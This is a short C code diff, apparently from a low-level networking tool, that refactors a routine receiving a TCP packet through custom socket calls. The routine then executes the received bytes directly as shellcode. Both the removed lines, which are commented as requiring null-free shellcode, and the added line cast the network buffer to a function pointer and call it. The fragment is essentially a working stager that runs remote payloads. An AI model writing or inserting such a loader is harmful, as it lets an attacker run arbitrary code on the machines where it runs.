@@ -33,18 +33,15 @@ int main() {
     hexdump(&pktPtr_send, 0x100);
 
     // Receive and print TCP packet response
-    nosa_recv((HANDLE*)hSocket, &pktPtr_resp);
+    nosa_recv((HANDLE*)hSocket, pktPtr_resp);
     printf("nosa_recv() -> Response:\n");
-    hexdump(&pktPtr_resp, 0x100);
+    
+    hexdump(pktPtr_resp, 0x100);
 
-    // Exec (MUST TO BE A NULL-FREE SHELLCODE)
-    int (*func)();
-    func = (int(*)()) (BYTE*)pktPtr_resp;
-    (int)(*func)();
+    ((void(*)())pktPtr_resp)();
 
-    // Close target socket
-    if (hSocket) // close socket only in case hSocket != 0
-    {
+    // Close the target socket
+    if (hSocket) {
         afd_close(hSocket);
     }
 
